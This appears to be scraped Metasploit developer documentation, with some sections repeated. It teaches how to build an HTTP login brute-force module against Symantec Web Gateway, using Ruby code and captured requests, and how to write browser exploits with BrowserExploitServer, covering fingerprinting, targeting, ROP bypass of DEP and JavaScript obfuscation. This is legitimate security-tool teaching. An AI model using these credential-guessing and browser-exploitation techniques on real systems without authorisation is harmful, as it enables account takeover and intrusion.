LoginScanner API can be found in the lib/metasploit/framework/loginscanner directory, and the Credential API can found as a metasploit-credential gem here . You will most likely want to read them while writing the login module. Step 1: Set up your target environment For our demonstration, we will be using Symantec Web Gateway . A trial is available at the vendor's website. Obviously downloading/installing it would be your first step. Step 2: Set up a client The purpose of setting up a client is to sample the login request and response. Normally you can do this with: A web browser plus a sniffer For the sniffer, you can download Wireshark , and have it running. Use a web browser to login. Go back to Wireshark and save the HTTP request, this is exactly what you will send in the login module. You will also need to save the HTTP response so that you can check for a successful and a failed login. A browser with Burp Burp is a tool for performing security testing of web applications. You can download the free version from the vendor's website. In some cases, Burp is way better than a sniffer because you can modify HTTP requests, it's also a very convenient way to capture HTTPS traffic. Here's what you do. Start Burp. Configure your web browser's proxy so Burp can forward traffic. Use the web browser to login. Go back to Burp, you can find the history of all the requests and responses. For our example, this is the request the browser sends to Symantec Web Gateway: POST /spywall/login.php HTTP/1.1 Host: 192.168.1.176 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:27.0) Gecko/20100101 Firefox/27.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://192.168.1.176/spywall/login.php Cookie: PHPSESSID=otgam4mgjrl00h2esk3o2npt05 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 54 USERNAME=gooduser&PASSWORD=GoodPassword&loginBtn=Login And this is the response Symantec Web Gateway returns for a successful login: HTTP/1.1 302 Found Date: Tue, 12 May 2015 19:32:31 GMT Server: Apache X-Frame-Options: SAMEORIGIN Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Set-Cookie: PHPSESSID=vmb56vhd7740oqcmth8cqtagq5; path=/; secure; HttpOnly Location: https://192.168.1.176/spywall/executive_summary.php Content-Length: 0 Keep-Alive: timeout=15, max=5000 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8 A failed login response is an HTTP 200 with the following message in the body: We're sorry, but the username or password you have entered is incorrect. Please retype your username and password. The username and password are case sensitive. Step 3: Start with a LoginScanner template Your login module mainly consists of three components: the LoginScanner portion, the auxiliary portion, and rpsec. The actual HTTP requests and responses are handled in the LoginScanner portion, so we'll start from there. Your most basic HTTP LoginScanner template will look like this: require 'metasploit/framework/login_scanner/http' module Metasploit module Framework module LoginScanner class SymantecWebGateway < HTTP # Attemps to login to the server. # # @param [Metasploit::Framework::Credential] credential The credential information. # @return [Result] A Result object indicating success or failure def attempt_login ( credential ) end end end end end Save it under lib/metasploit/framework/login_scanner/. The #attempt_login method The #attempt_login is called automatically. You can write your entire login code there, but it's better to break in down into multiple methods so that the code is cleaner, and easier to document and rspec. Typically, all you want #attempt_login to do is focusing on crafting the Result object, pass it to a custom #login routine, and then return the Result object. It almost always looks something like this: def attempt_login ( credential ) # Default Result result_opts = { credential : credential , status : Metasploit :: Model :: Login :: Status :: INCORRECT , proof : nil , host : host , port : port , protocol : 'tcp' } # Merge login result # credential.public is the username # credential.private is the password result_opts . merge! ( do_login ( credential . public , credential . private )) # Return the Result object Result . new ( result_opts ) end Notice that: By default, our proof is nil. The status is Metasploit::Model::Login::Status::INCORRECT. We're calling #do_login, which is our custom login method. The #do_login method will have to update status and proof before we return the Result object. The custom login method Ok, now let's talk about building this #do_login method. This is where we send the same HTTP request we sampled earlier. If you're already familiar with writing a Metasploit module that sends an HTTP request, the first thing that comes to mind is probably using the HttpClient . Well, you can't do that at all over here, so we have to fall back to Rex::Proto::Http::Client . Fortunately for you, we made all this a little bit easier by creating another request called #send_request, here's an example of how to use that: send_request ({ 'uri' => '/' }) You will rely on this method a lot to accomplish most of what you need to do here. Ok, now, let's move on and talk about how to use #send_request to send a login request. Remember in the login request, there is actually a PHPSESSID cookie, you should obtain this first. Usually the web application will give you the session cookie when you request the login page for the very first time, and this happens a lot. Here's an example of how to grab PHPSESSID: def get_session_id login_uri = normalize_uri ( \" #{ uri } /spywall/login.php\" ) res = send_request ({ 'uri' => login_uri }) sid = res . get_cookies . scan ( /(PHPSESSID=\\w+);*/ ) . flatten [ 0 ] || '' return sid end Now that you have a session ID, you can finally make the login request. Remember in the sample, we have to submit the username, password, loginBtn as a POST request. So let's do that with #send_request: protocol = ssl ? 'https' : 'http' peer = \" #{ host } : #{ port } \" login_uri = normalize_uri ( \" #{ uri } /spywall/login.php\" ) res = send_request ({ 'uri' => login_uri , 'method' => 'POST' , 'cookie' => get_session_id , 'headers' => { 'Referer' => \" #{ protocol } :// #{ peer } / #{ login_uri } \" }, 'vars_post' => { 'USERNAME' => username , 'PASSWORD' => password , 'loginBtn' => 'Login' # Found in the HTML form } }) Now that the request is sent, we need to check the response (the res variable). Typically, you have a few choices to determine a successful login: Check the HTTP response code . In this case, we have a 302 (redirect), but know that sometimes the response code can lie so this should not be your first choice. Check the HTML . With some web applications, you might get a \"successful login\" message, and you can regex that. This is most likely the most accurate way. Check the location header . In our case, Symantec returns a 302 and contains no body. But it redirects us to a spywall/executive_summary.php page in the location header, so we can use that. We can also try to access executive_summary.php with a renewed session ID, and make sure we can actually see the admin interface, but requesting an extra page adds more penalty to performance, so this is up to you. In the end, your custom login method will probably look something like this: def do_login ( username , password ) protocol = ssl ? 'https' : 'http' peer = \" #{ host } : #{ port } \" login_uri = normalize_uri ( \" #{ uri } /spywall/login.php\" ) res = send_request ({ 'uri' => login_uri , 'method' => 'POST' , 'cookie' => get_session_id , 'headers' => { 'Referer' => \" #{ protocol } :// #{ peer } / #{ login_uri } \" }, 'vars_post' => { 'USERNAME' => username , 'PASSWORD' => password , 'loginBtn' => 'Login' # Found in the HTML form } }) if res && res . headers [ 'Location' ]. include? ( 'executive_summary.php' ) return { :status => LOGIN_STATUS :: SUCCESSFUL , :proof => res . to_s } end { :proof => res . to_s } end The exact statuses you can return are: Constant Purpose Metasploit::Model::Login::Status::DENIED_ACCESS Access is denied Metasploit::Model::Login::Status::DISABLED Account is disabled Metasploit::Model::Login::Status::INCORRECT Credential is incorrect Metasploit::Model::Login::Status::LOCKED_OUT Account has been locked out Metasploit::Model::Login::Status::NO_AUTH_REQUIRED No authentication Metasploit::Model::Login::Status::SUCCESSFUL Successful login Metasploit::Model::Login::Status::UNABLE_TO_CONNECT Unable to connect to the service Metasploit::Model::Login::Status::UNTRIED Credential has not been tried Metasploit::Model::Login::Status::ALL All the above (An array) When you're done, your code will look something like this: https://github.com/rapid7/metasploit-framework/blob/master/lib/metasploit/framework/login_scanner/symantec_web_gateway.rb Step 4: Write the auxiliary module The auxiliary module acts more like an user-interface. You describe what the module does, handles options, initializes objects, and do reporting. A basic auxiliary module template in our case would be something like this: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' require 'metasploit/framework/login_scanner/symantec_web_gateway' require 'metasploit/framework/credential_collection' class MetasploitModule < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient include Msf :: Auxiliary :: AuthBrute include Msf :: Auxiliary :: Report include Msf :: Auxiliary :: Scanner def initialize ( info = {}) super ( update_info ( info , 'Name' => 'Symantec Web Gateway Login Utility' , 'Description' => %q{ This module will attempt to authenticate to a Symantec Web Gateway. } , 'Author' => [ 'sinn3r' ] , 'License' => MSF_LICENSE , 'DefaultOptions' => { 'RPORT' => 443 , 'SSL' => true , 'SSLVersion' => 'TLS1' } )) end def run_host ( ip ) end end Save it under modules/auxiliary/scanner/http/. Our main method is #run_host, so we'll begin there. But before we do, we must initialize your LoginScanner object. The following is an example of how you will probably write it. def scanner ( ip ) @scanner ||= lambda { cred_collection = Metasploit :: Framework :: CredentialCollection . new ( blank_passwords : datastore [ 'BLANK_PASSWORDS' ] , pass_file : datastore [ 'PASS_FILE' ] , password : datastore [ 'PASSWORD' ] , user_file : datastore [ 'USER_FILE' ] , userpass_file : datastore [ 'USERPASS_FILE' ] , username : datastore [ 'USERNAME' ] , user_as_pass : datastore [ 'USER_AS_PASS' ] ) return Metasploit :: Framework :: LoginScanner :: SymantecWebGateway . new ( configure_http_login_scanner ( host : ip , port : datastore [ 'RPORT' ] , cred_details : cred_collection , stop_on_success : datastore [ 'STOP_ON_SUCCESS' ] , bruteforce_speed : datastore [ 'BRUTEFORCE_SPEED' ] , connection_timeout : 5 )) } . call end Notice that this scanner method can be called multiple times, but the use of lambda will allow the LoginScanner object to initialize only once. After that first time, every time the method is called, it will just return @scanner instead of going through the whole initialization process again. In some cases you might need to pass more datastore options, maybe not. For example, if you want to allow the URI to be configurable (which is also already an accessor in Metasploit::Framework::LoginScanner::HTTP ), then you have to create and pass datastore['URI'] to configure_http_login_scanner too, like so: uri : datastore [ 'URI' ] And then in your LoginScanner, pass uri to #send_request: send_request ({ 'uri' => uri }) At this point, the scanner method holds our Metasploit::Framework::LoginScanner::SymantecWebGateway object. If we call the #scan! method, it will trigger the #attempt_login method we wrote earlier, and then yield the Result object. Basically like this: scanner ( ip ) . scan! do | result | # result = Our Result object end With the Result object, we can start reporting. In most cases, you will probably be using #create_credential_login to report a successful login. And use #invalidate_login to report a bad one. Reporting a valid credential The credential API knows a lot about a credential, such as when it was used, how it was used, serviced tried, target IP, port, etc, etc. So when we report, that's how much information we are storing for every credential. To make credential reporting easy to use, all you need to do is call the #store_valid_credential method like this: store_valid_credential ( user : result . credential . public , private : result . credential . private , private_type : :password , # This is optional proof : nil , # This is optional ) Report an invalid credential Here's another example you can use: # Reports a bad credential. # # @param [String] ip Target host # @param [Fixnum] port Target port # @param [Result] The Result object # @return [void] def report_bad_cred ( ip , rport , result ) invalidate_login ( address : ip , port : rport , protocol : 'tcp' , public : result . credential . public , private : result . credential . private , realm_key : result . credential . realm_key , realm_value : result . credential . realm , status : result . status , proof : result . proof ) end At this point, you're pretty much done with the auxiliary module. It will probably look something like this: https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/symantec_web_gateway_login.rb Test And finally, make sure your module actually works. Test for a successful login: msf auxiliary(symantec_web_gateway_login) > run [+] 192.168.1.176:443 SYMANTEC_WEB_GATEWAY - Success: 'sinn3r:GoodPassword' [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(symantec_web_gateway_login) > Test for a failed login: msf auxiliary(symantec_web_gateway_login) > run [-] 192.168.1.176:443 SYMANTEC_WEB_GATEWAY - Failed: 'sinn3r:BadPass' [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(symantec_web_gateway_login) >","title":"How to write a HTTP LoginScanner Module"},{"location":"dev/dark/How-to-write-a-HTTP-LoginScanner-Module/#step-1-set-up-your-target-environment","text":"For our demonstration, we will be using Symantec Web Gateway . A trial is available at the vendor's website. Obviously downloading/installing it would be your first step.","title":"Step 1: Set up your target environment"},{"location":"dev/dark/How-to-write-a-HTTP-LoginScanner-Module/#step-2-set-up-a-client","text":"The purpose of setting up a client is to sample the login request and response. Normally you can do this with: A web browser plus a sniffer For the sniffer, you can download Wireshark , and have it running. Use a web browser to login. Go back to Wireshark and save the HTTP request, this is exactly what you will send in the login module. You will also need to save the HTTP response so that you can check for a successful and a failed login. A browser with Burp Burp is a tool for performing security testing of web applications. You can download the free version from the vendor's website. In some cases, Burp is way better than a sniffer because you can modify HTTP requests, it's also a very convenient way to capture HTTPS traffic. Here's what you do. Start Burp. Configure your web browser's proxy so Burp can forward traffic. Use the web browser to login. Go back to Burp, you can find the history of all the requests and responses. For our example, this is the request the browser sends to Symantec Web Gateway: POST /spywall/login.php HTTP/1.1 Host: 192.168.1.176 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:27.0) Gecko/20100101 Firefox/27.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://192.168.1.176/spywall/login.php Cookie: PHPSESSID=otgam4mgjrl00h2esk3o2npt05 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 54 USERNAME=gooduser&PASSWORD=GoodPassword&loginBtn=Login And this is the response Symantec Web Gateway returns for a successful login: HTTP/1.1 302 Found Date: Tue, 12 May 2015 19:32:31 GMT Server: Apache X-Frame-Options: SAMEORIGIN Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Set-Cookie: PHPSESSID=vmb56vhd7740oqcmth8cqtagq5; path=/; secure; HttpOnly Location: https://192.168.1.176/spywall/executive_summary.php Content-Length: 0 Keep-Alive: timeout=15, max=5000 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8 A failed login response is an HTTP 200 with the following message in the body: We're sorry, but the username or password you have entered is incorrect. Please retype your username and password. The username and password are case sensitive.","title":"Step 2: Set up a client"},{"location":"dev/dark/How-to-write-a-HTTP-LoginScanner-Module/#step-3-start-with-a-loginscanner-template","text":"Your login module mainly consists of three components: the LoginScanner portion, the auxiliary portion, and rpsec. The actual HTTP requests and responses are handled in the LoginScanner portion, so we'll start from there. Your most basic HTTP LoginScanner template will look like this: require 'metasploit/framework/login_scanner/http' module Metasploit module Framework module LoginScanner class SymantecWebGateway < HTTP # Attemps to login to the server. # # @param [Metasploit::Framework::Credential] credential The credential information. # @return [Result] A Result object indicating success or failure def attempt_login ( credential ) end end end end end Save it under lib/metasploit/framework/login_scanner/. The #attempt_login method The #attempt_login is called automatically. You can write your entire login code there, but it's better to break in down into multiple methods so that the code is cleaner, and easier to document and rspec. Typically, all you want #attempt_login to do is focusing on crafting the Result object, pass it to a custom #login routine, and then return the Result object. It almost always looks something like this: def attempt_login ( credential ) # Default Result result_opts = { credential : credential , status : Metasploit :: Model :: Login :: Status :: INCORRECT , proof : nil , host : host , port : port , protocol : 'tcp' } # Merge login result # credential.public is the username # credential.private is the password result_opts . merge! ( do_login ( credential . public , credential . private )) # Return the Result object Result . new ( result_opts ) end Notice that: By default, our proof is nil. The status is Metasploit::Model::Login::Status::INCORRECT. We're calling #do_login, which is our custom login method. The #do_login method will have to update status and proof before we return the Result object. The custom login method Ok, now let's talk about building this #do_login method. This is where we send the same HTTP request we sampled earlier. If you're already familiar with writing a Metasploit module that sends an HTTP request, the first thing that comes to mind is probably using the HttpClient . Well, you can't do that at all over here, so we have to fall back to Rex::Proto::Http::Client . Fortunately for you, we made all this a little bit easier by creating another request called #send_request, here's an example of how to use that: send_request ({ 'uri' => '/' }) You will rely on this method a lot to accomplish most of what you need to do here. Ok, now, let's move on and talk about how to use #send_request to send a login request. Remember in the login request, there is actually a PHPSESSID cookie, you should obtain this first. Usually the web application will give you the session cookie when you request the login page for the very first time, and this happens a lot. Here's an example of how to grab PHPSESSID: def get_session_id login_uri = normalize_uri ( \" #{ uri } /spywall/login.php\" ) res = send_request ({ 'uri' => login_uri }) sid = res . get_cookies . scan ( /(PHPSESSID=\\w+);*/ ) . flatten [ 0 ] || '' return sid end Now that you have a session ID, you can finally make the login request. Remember in the sample, we have to submit the username, password, loginBtn as a POST request. So let's do that with #send_request: protocol = ssl ? 'https' : 'http' peer = \" #{ host } : #{ port } \" login_uri = normalize_uri ( \" #{ uri } /spywall/login.php\" ) res = send_request ({ 'uri' => login_uri , 'method' => 'POST' , 'cookie' => get_session_id , 'headers' => { 'Referer' => \" #{ protocol } :// #{ peer } / #{ login_uri } \" }, 'vars_post' => { 'USERNAME' => username , 'PASSWORD' => password , 'loginBtn' => 'Login' # Found in the HTML form } }) Now that the request is sent, we need to check the response (the res variable). Typically, you have a few choices to determine a successful login: Check the HTTP response code . In this case, we have a 302 (redirect), but know that sometimes the response code can lie so this should not be your first choice. Check the HTML . With some web applications, you might get a \"successful login\" message, and you can regex that. This is most likely the most accurate way. Check the location header . In our case, Symantec returns a 302 and contains no body. But it redirects us to a spywall/executive_summary.php page in the location header, so we can use that. We can also try to access executive_summary.php with a renewed session ID, and make sure we can actually see the admin interface, but requesting an extra page adds more penalty to performance, so this is up to you. In the end, your custom login method will probably look something like this: def do_login ( username , password ) protocol = ssl ? 'https' : 'http' peer = \" #{ host } : #{ port } \" login_uri = normalize_uri ( \" #{ uri } /spywall/login.php\" ) res = send_request ({ 'uri' => login_uri , 'method' => 'POST' , 'cookie' => get_session_id , 'headers' => { 'Referer' => \" #{ protocol } :// #{ peer } / #{ login_uri } \" }, 'vars_post' => { 'USERNAME' => username , 'PASSWORD' => password , 'loginBtn' => 'Login' # Found in the HTML form } }) if res && res . headers [ 'Location' ]. include? ( 'executive_summary.php' ) return { :status => LOGIN_STATUS :: SUCCESSFUL , :proof => res . to_s } end { :proof => res . to_s } end The exact statuses you can return are: Constant Purpose Metasploit::Model::Login::Status::DENIED_ACCESS Access is denied Metasploit::Model::Login::Status::DISABLED Account is disabled Metasploit::Model::Login::Status::INCORRECT Credential is incorrect Metasploit::Model::Login::Status::LOCKED_OUT Account has been locked out Metasploit::Model::Login::Status::NO_AUTH_REQUIRED No authentication Metasploit::Model::Login::Status::SUCCESSFUL Successful login Metasploit::Model::Login::Status::UNABLE_TO_CONNECT Unable to connect to the service Metasploit::Model::Login::Status::UNTRIED Credential has not been tried Metasploit::Model::Login::Status::ALL All the above (An array) When you're done, your code will look something like this: https://github.com/rapid7/metasploit-framework/blob/master/lib/metasploit/framework/login_scanner/symantec_web_gateway.rb","title":"Step 3: Start with a LoginScanner template"},{"location":"dev/dark/How-to-write-a-HTTP-LoginScanner-Module/#step-4-write-the-auxiliary-module","text":"The auxiliary module acts more like an user-interface. You describe what the module does, handles options, initializes objects, and do reporting. A basic auxiliary module template in our case would be something like this: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' require 'metasploit/framework/login_scanner/symantec_web_gateway' require 'metasploit/framework/credential_collection' class MetasploitModule < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient include Msf :: Auxiliary :: AuthBrute include Msf :: Auxiliary :: Report include Msf :: Auxiliary :: Scanner def initialize ( info = {}) super ( update_info ( info , 'Name' => 'Symantec Web Gateway Login Utility' , 'Description' => %q{ This module will attempt to authenticate to a Symantec Web Gateway. } , 'Author' => [ 'sinn3r' ] , 'License' => MSF_LICENSE , 'DefaultOptions' => { 'RPORT' => 443 , 'SSL' => true , 'SSLVersion' => 'TLS1' } )) end def run_host ( ip ) end end Save it under modules/auxiliary/scanner/http/. Our main method is #run_host, so we'll begin there. But before we do, we must initialize your LoginScanner object. The following is an example of how you will probably write it. def scanner ( ip ) @scanner ||= lambda { cred_collection = Metasploit :: Framework :: CredentialCollection . new ( blank_passwords : datastore [ 'BLANK_PASSWORDS' ] , pass_file : datastore [ 'PASS_FILE' ] , password : datastore [ 'PASSWORD' ] , user_file : datastore [ 'USER_FILE' ] , userpass_file : datastore [ 'USERPASS_FILE' ] , username : datastore [ 'USERNAME' ] , user_as_pass : datastore [ 'USER_AS_PASS' ] ) return Metasploit :: Framework :: LoginScanner :: SymantecWebGateway . new ( configure_http_login_scanner ( host : ip , port : datastore [ 'RPORT' ] , cred_details : cred_collection , stop_on_success : datastore [ 'STOP_ON_SUCCESS' ] , bruteforce_speed : datastore [ 'BRUTEFORCE_SPEED' ] , connection_timeout : 5 )) } . call end Notice that this scanner method can be called multiple times, but the use of lambda will allow the LoginScanner object to initialize only once. After that first time, every time the method is called, it will just return @scanner instead of going through the whole initialization process again. In some cases you might need to pass more datastore options, maybe not. For example, if you want to allow the URI to be configurable (which is also already an accessor in Metasploit::Framework::LoginScanner::HTTP ), then you have to create and pass datastore['URI'] to configure_http_login_scanner too, like so: uri : datastore [ 'URI' ] And then in your LoginScanner, pass uri to #send_request: send_request ({ 'uri' => uri }) At this point, the scanner method holds our Metasploit::Framework::LoginScanner::SymantecWebGateway object. If we call the #scan! method, it will trigger the #attempt_login method we wrote earlier, and then yield the Result object. Basically like this: scanner ( ip ) . scan! do | result | # result = Our Result object end With the Result object, we can start reporting. In most cases, you will probably be using #create_credential_login to report a successful login. And use #invalidate_login to report a bad one. Reporting a valid credential The credential API knows a lot about a credential, such as when it was used, how it was used, serviced tried, target IP, port, etc, etc. So when we report, that's how much information we are storing for every credential. To make credential reporting easy to use, all you need to do is call the #store_valid_credential method like this: store_valid_credential ( user : result . credential . public , private : result . credential . private , private_type : :password , # This is optional proof : nil , # This is optional ) Report an invalid credential Here's another example you can use: # Reports a bad credential. # # @param [String] ip Target host # @param [Fixnum] port Target port # @param [Result] The Result object # @return [void] def report_bad_cred ( ip , rport , result ) invalidate_login ( address : ip , port : rport , protocol : 'tcp' , public : result . credential . public , private : result . credential . private , realm_key : result . credential . realm_key , realm_value : result . credential . realm , status : result . status , proof : result . proof ) end At this point, you're pretty much done with the auxiliary module. It will probably look something like this: https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/symantec_web_gateway_login.rb","title":"Step 4: Write the auxiliary module"},{"location":"dev/dark/How-to-write-a-HTTP-LoginScanner-Module/#test","text":"And finally, make sure your module actually works. Test for a successful login: msf auxiliary(symantec_web_gateway_login) > run [+] 192.168.1.176:443 SYMANTEC_WEB_GATEWAY - Success: 'sinn3r:GoodPassword' [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(symantec_web_gateway_login) > Test for a failed login: msf auxiliary(symantec_web_gateway_login) > run [-] 192.168.1.176:443 SYMANTEC_WEB_GATEWAY - Failed: 'sinn3r:BadPass' [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(symantec_web_gateway_login) >","title":"Test"},{"location":"dev/dark/How-to-write-a-browser-exploit-using-BrowserExploitServer/","text":"The Metasploit Framework provides different mixins you can use to develop a browser exploit, mainly they are: Msf::Exploit::Remote::HttpServer - The most basic form of a HTTP server. Msf::Exploit::Remote::HttpServer::HTML - which provides Javascript functions that the module can use when crafting HTML contents. Msf::Exploit::Remote::BrowserExploitServer - which includes features from both HttpServer and HttpServer::HTML, but with even more goodies. This writeup covers the BrowserExploitServer mixin. The Automatic Exploitation Procedure The BrowserExploitServer mixin is the only mixin specially designed for browser exploitation. Before you use this mixin, you should understand what it does behind the scenes for you: It automatically collects the browser information, including things like: OS name, version, browser name, browser version, whether a proxy is used, Java plugin version, Microsoft Office version, etc, etc. If the browser doesn't have Javascript enabled, then it knows less about the target. All the info gathered will be stored in a profile managed by the mixin. The mixin will then tag the browser to track the session. It will also use the same tag to retrieve the profile when needed. Before the mixin decides if it should serve the exploit to the browser, it will check with the module for any exploitable requirements. If the requirements aren't met, it will send a 404 to the browser, and the operation bails. If the requirements are met, the mixin will pass the profile (information about the browser gathered during the detection stage) to the module, and let it take over the rest. Hint: In the module, you can check the :source key in the profile to determine whether Javascript is enabled or not: If the :source is \"script\", it means Javascript is enabled. If it's \"headers\" (as in HTTP headers), then the browser has Javascript disabled. Setting Exploitable Requirements Being able to set browser requirements is an important feature of the mixin. It allows your attack to be smarter, more targeted, and prevents accidents. Here's a scenario: Say you have a vulnerability against Internet Explorer that only affects a specific range of MSHTML builds, you can set the :os_name, :ua_name, :ua_ver, and :mshtml_build to make sure it doesn't blindly exploit against anything else. The :mshtml_build requirement can be found in \"Product version\" under MSHTML's file properties. Exploitable browser requirements are defined under \"BrowserRequirements\" in the module's metadata. Here's an example of defining a vulnerable target running some ActiveX control: 'BrowserRequirements' => { source : /script/i , activex : [ { clsid : '{D27CDB6E-AE6D-11cf-96B8-444553540000}' , method : 'LoadMovie' } ] , os_name : /win/i } You can also define target-specific requirements. This is also how the mixin is able to automatically select a target, and you can get it with the \"get_target\" method. Here's an example of how to define target-specific requirements for IE8 on Win XP and IE 9 on Win 7: 'BrowserRequirements' => { :source => /script|headers/i , 'ua_name' => HttpClients :: IE , }, 'Targets' => [ [ 'Automatic' , {} ] , [ 'Windows XP with IE 8' , { :os_name => 'Windows XP' , 'ua_ver' => '8.0' , 'Rop' => true , 'Offset' => 0x100 } ] , [ 'Windows 7 with IE 9' , { 'os_name' => 'Windows 7' , 'ua_ver' => '9.0' , 'Rop' => true , 'Offset' => 0x200 } ] ] You can use these for :os_name : Constant Purpose OperatingSystems::Match::WINDOWS Match all versions of Windows OperatingSystems::Match::WINDOWS_95 Match Windows 95 OperatingSystems::Match::WINDOWS_98 Match Windows 98 OperatingSystems::Match::WINDOWS_ME Match Windows ME OperatingSystems::Match::WINDOWS_NT3 Match Windows NT 3 OperatingSystems::Match::WINDOWS_NT4 Match Windows NT 4 OperatingSystems::Match::WINDOWS_2000 Match Windows 2000 OperatingSystems::Match::WINDOWS_XP Match Windows XP OperatingSystems::Match::WINDOWS_2003 Match Windows Server 2003 OperatingSystems::Match::WINDOWS_VISTA Match Windows Vista OperatingSystems::Match::WINDOWS_2008 Match Windows Server 2008 OperatingSystems::Match::WINDOWS_7 Match Windows 7 OperatingSystems::Match::WINDOWS_2012 Match Windows 2012 OperatingSystems::Match::WINDOWS_8 Match Windows 8 OperatingSystems::Match::WINDOWS_81 Match Windows 8.1 OperatingSystems::Match::LINUX Match a Linux distro OperatingSystems::Match::MAC_OSX Match Mac OSX OperatingSystems::Match::FREEBSD Match FreeBSD OperatingSystems::Match::NETBSD Match NetBSD OperatingSystems::Match::OPENBSD Match OpenBSD OperatingSystems::Match::VMWARE Match VMWare OperatingSystems::Match::ANDROID Match Android OperatingSystems::Match::APPLE_IOS Match Apple IOS You can use these for :ua_name : Constant Value HttpClients::IE \"MSIE\" HttpClients::FF \"Firefox\" HttpClients::SAFARI \"Safari\" HttpClients::OPERA \"Opera\" HttpClients::CHROME \"Chrome\" More of these constants can be found here: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/constants.rb All currently supported requirements by the mixin can be found here (see REQUIREMENT_KEY_SET): https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/browser_exploit_server.rb#L46 Set up a listener After the detection stage and the requirement check, the mixin will trigger the \"on_request_exploit\" callback method, that's where you handle the HTTP request, craft the HTML, and send back the exploit response. Here's an example of how to set up \"on_request_exploit\": # # Listens for the HTTP request # cli is the socket # request is the Rex::Proto::Http::Request object # target_info is a hash that contains all the browser info (aka the profile) # def on_request_exploit ( cli , request , target_info ) print_status ( \"Here's what I know about the target: #{ target_info . inspect } \" ) end Crafting HTML with BrowserExploitServer There are two coding styles the BrowserExploitServer mixin supports: The good old HTML, or ERB template. The first is pretty self-explanatory: def on_request_exploit ( cli , request , target_info ) html = %Q| <html> Hello, world! </html> | send_exploit_html ( cli , html ) end ERB is a new way to write Metasploit browser exploits. If you've written one or two web applications, this is no stranger to you. When you're using the BrowserExploitServer mixin to write an exploit, what really happens is you're writing a rails template. Here's an example of using of this feature: def on_request_exploit ( cli , request , target_info ) html = %Q| <html> Do you feel lucky, punk?<br> <% if [true, false].sample %> Lucky!<br> <% else %> Bad luck, bro!<Br> <% end %> </html> | send_exploit_html ( cli , html ) end If you want to access local variables or arguments, make sure to pass the binding object to send_exploit_html: def exploit_template1 ( target_info , txt ) txt2 = \"I can use local vars!\" template = %Q| <% msg = \"This page is generated by an exploit\" %> <%=msg%><br> <%=txt%><br> <%=txt2%><br> <p></p> Data gathered from source: #{ target_info [ :source ] } <br> OS name: #{ target_info [ :os_name ] } <br> UA name: #{ target_info [ :ua_name ] } <br> UA version: #{ target_info [ :ua_ver ] } <br> Java version: #{ target_info [ :java ] } <br> Office version: #{ target_info [ :office ] } | return template , binding () end def on_request_exploit ( cli , request , target_info ) send_exploit_html ( cli , exploit_template ( target_info , txt )) end The BrowserExploitServer mixin also offers plenty of other things useful while crafting the exploit. For example: it can generate a target-specific payload when you call the \"get_payload\" method. It also gives you access to the RopDb mixin, which contains a collection of ROPs to bypass DEP (Data Execution Prevention). Make sure to check out the API documentation for more information. To get thing started, here's a code example you can use start developing your browser exploit: ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: BrowserExploitServer def initialize ( info = {}) super ( update_info ( info , 'Name' => \"BrowserExploitServer Example\" , 'Description' => %q{ This is an example of building a browser exploit using the BrowserExploitServer mixin } , 'License' => MSF_LICENSE , 'Author' => [ 'sinn3r' ] , 'References' => [ [ 'URL' , 'http://metasploit.com' ] ] , 'Platform' => 'win' , 'BrowserRequirements' => { :source => /script|headers/i , }, 'Targets' => [ [ 'Automatic' , {} ] , [ 'Windows XP with IE 8' , { 'os_name' => 'Windows XP' , 'ua_name' => 'MSIE' , 'ua_ver' => '8.0' } ] , [ 'Windows 7 with IE 9' , { 'os_name' => 'Windows 7' , 'ua_name' => 'MSIE' , 'ua_ver' => '9.0' } ] ] , 'Payload' => { 'BadChars' => \" \\x00 \" }, 'DisclosureDate' => \"Apr 1 2013\" , 'DefaultTarget' => 0 )) end def exploit_template ( target_info ) template = %Q| Data source: <%=target_info[:source]%><br> OS name: <%=target_info[:os_name]%><br> UA name: <%=target_info[:ua_name]%><br> UA version: <%=target_info[:ua_ver]%><br> Java version: <%=target_info[:java]%><br> Office version: <%=target_info[:office]%> | return template , binding () end def on_request_exploit ( cli , request , target_info ) send_exploit_html ( cli , exploit_template ( target_info )) end end JavaScript Obfuscation BrowserExploitServer relies on the JSObfu mixin to support JavaScript obfuscation. When you're writing JavaScript, you should always write it like this: js = js_obfuscate ( your_code ) The #js_obfuscate will return a Rex::Exploitation::JSObfu object. To get the obfuscated JavaScript, call the #to_s method: js . to_s If you need to access an obfuscated symbol name, you can use then #sym method: # Get the obfuscated version of function name test() var_name = js . sym ( 'test' ) Note that by default, even though your module is calling the #js_obfuscate method, obfuscation will not kick in unless the user sets the 